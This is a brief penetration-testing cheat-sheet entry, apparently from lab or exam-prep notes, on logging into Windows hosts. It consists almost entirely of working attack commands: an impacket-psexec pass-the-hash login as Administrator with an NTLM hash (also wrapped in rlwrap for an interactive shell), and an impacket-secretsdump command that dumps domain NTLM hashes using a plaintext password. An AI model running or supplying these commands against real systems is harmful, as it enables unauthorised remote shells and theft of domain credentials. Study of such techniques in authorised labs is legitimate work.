Another way to log into windows systems
```
impacket-psexec RALPH/Administrator@10.11.1.31 -hashes :f58b86e89c8631e432cf1a034662853f
```

![unnamed_bdfd52877a8342d09d1748027b4ca4e3](unnamed_bdfd52877a8342d09d1748027b4ca4e3.png)

can be used with rlwrap for better shell:
```
rlwrap impacket-psexec RALPH/Administrator@10.11.1.31 -hashes :f58b86e89c8631e432cf1a034662853f

impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$target
```